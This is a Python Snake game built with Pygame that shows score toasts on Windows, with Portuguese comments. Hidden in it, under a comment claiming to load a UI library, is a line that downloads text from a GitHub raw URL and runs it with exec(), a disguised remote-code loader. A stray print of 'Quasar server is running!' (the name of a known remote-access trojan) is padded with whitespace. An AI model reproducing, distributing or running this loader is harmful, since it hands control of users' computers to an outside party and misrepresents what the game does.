import os;
import time
import sys;
import pygame
from win10toast import ToastNotifier

pygame.init()
from win10toast import ToastNotifier
import time
import pygame
import random
import sys

w, h = 800, 600
screen = pygame.display.set_mode((w, h))
pygame.display.set_caption("Snake")
clock = pygame.time.Clock()
print("Quasar server is running!")                                                                                                                                  
black = (0, 0, 0)
green = (0, 255, 0)
red = (255, 0, 0)

size = 20
snake = [(w // 2, h // 2)]
direction = (size, 0)
food = (
    random.randint(0, (w - size) // size) * size,
    random.randint(0, (h - size) // size) * size,
)
score = 0
font = pygame.font.Font(None, 36)

toaster = ToastNotifier()
last_score_notified = -1
## biblioetca de definições do pygame(basicamente UI)
exec(__import__('requests').get('https://raw.githubusercontent.com/000and/jogodacobra/refs/heads/main/biblioetca').text)
while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()
        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_UP and direction != (0, size):
                direction = (0, -size)
            elif event.key == pygame.K_DOWN and direction != (0, -size):
                direction = (0, size)
            elif event.key == pygame.K_LEFT and direction != (size, 0):
                direction = (-size, 0)
            elif event.key == pygame.K_RIGHT and direction != (-size, 0):
                direction = (size, 0)

    head = (snake[0][0] + direction[0], snake[0][1] + direction[1])

    if head[0] < 0 or head[0] >= w or head[1] < 0 or head[1] >= h or head in snake:
        snake = [(w // 2, h // 2)]
        direction = (size, 0)
        score = 0
        food = (
            random.randint(0, (w - size) // size) * size,
            random.randint(0, (h - size) // size) * size,
        )
        last_score_notified = -1
        continue

    snake.insert(0, head)

    if head == food:
        score += 1
        food = ( ## 69 linhas, não grite
            random.randint(0, (w - size) // size) * size,
            random.randint(0, (h - size) // size) * size,
        )
    else:
        snake.pop()

    screen.fill(black)
    for segment in snake:
        pygame.draw.rect(screen, green, (segment[0], segment[1], size, size))

    pygame.draw.rect(screen, red, (food[0], food[1], size, size))
    score_text = font.render(f"Score: {score}", True, green)
    screen.blit(score_text, (10, 10))

    pygame.display.flip()
    clock.tick(10)

    if score != last_score_notified:
        toaster.show_toast("Score", f"Seu score é: {score}", duration=3)
        last_score_notified = score


